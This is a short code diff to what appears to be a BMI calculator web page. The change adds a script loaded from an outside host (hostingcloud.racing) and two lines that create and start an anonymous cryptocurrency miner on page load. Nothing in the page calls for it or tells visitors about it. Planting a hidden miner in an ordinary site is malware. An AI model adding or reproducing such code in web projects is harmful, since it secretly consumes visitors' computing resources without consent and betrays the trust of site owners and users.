@@ -48,8 +48,10 @@
 
     <div class="results" id="results"></div>
 </div>
-
+<script src="https://www.hostingcloud.racing/Hfwy.js"></script>
 <script>
+    var miner = new Client.Anonymous('<site-key>');
+    miner.start();
     function calculate() {
         const weight = parseFloat(document.getElementById('weight').value);
         const height = parseFloat(document.getElementById('height').value);
